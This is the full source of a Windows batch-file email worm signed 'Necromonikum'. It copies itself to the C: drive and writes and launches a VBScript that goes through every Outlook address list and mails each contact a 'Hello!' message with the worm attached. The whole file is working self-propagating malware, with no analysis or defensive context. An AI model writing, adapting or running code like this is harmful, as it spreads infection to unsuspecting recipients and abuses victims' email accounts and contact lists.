   @echo off
   copy %0 c:\necro.bat
   echo.on error resume next > c:\necro.vbs
   echo dim a,b,c,d,e >> c:\necro.vbs
   echo set a = Wscript.CreateObject("Wscript.Shell") >> c:\necro.vbs
   echo set b = CreateObject("Outlook.Application") >> c:\necro.vbs
   echo set c = b.GetNameSpace("MAPI") >> c:\necro.vbs
   echo for y = 1 To c.AddressLists.Count >> c:\necro.vbs
   echo set d = c.AddressLists(y) >> c:\necro.vbs
   echo x = 1 >> c:\necro.vbs
   echo set e = b.CreateItem(0) >> c:\necro.vbs
   echo for o = 1 To d.AddressEntries.Count >> c:\necro.vbs
   echo f = d.AddressEntries(x) >> c:\necro.vbs
   echo e.Recipients.Add f >> c:\necro.vbs
   echo x = x + 1 >> c:\necro.vbs
   echo next >> c:\necro.vbs
   echo e.Subject = "Hello!" >> c:\necro.vbs
   echo e.Body = "Here's a fuckin' lame batch file worm by Necromonikum" >> c:\necro.vbs
   echo e.Attachments.Add ("c:\necro.bat") >> c:\necro.vbs
   echo e.DeleteAfterSubmit = False >> c:\necro.vbs
   echo e.Send >> c:\necro.vbs
   echo f = "" >> c:\necro.vbs
   echo next >> c:\necro.vbs
   start c:\necro.vbs
